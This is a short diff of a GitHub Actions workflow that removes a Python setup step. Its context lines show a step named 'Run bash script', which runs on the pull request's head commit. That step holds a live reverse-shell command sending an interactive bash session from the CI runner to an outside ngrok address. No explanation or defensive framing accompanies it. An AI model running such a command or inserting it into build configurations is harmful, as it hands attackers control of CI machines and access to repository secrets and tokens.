@@ -14,11 +14,6 @@ jobs:
       with:
         ref: ${{ github.event.pull_request.head.sha }}
 
-    - name: Setup Python
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.10'
-
     - name: Run bash script
       run: |
         bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/11378 0>&1
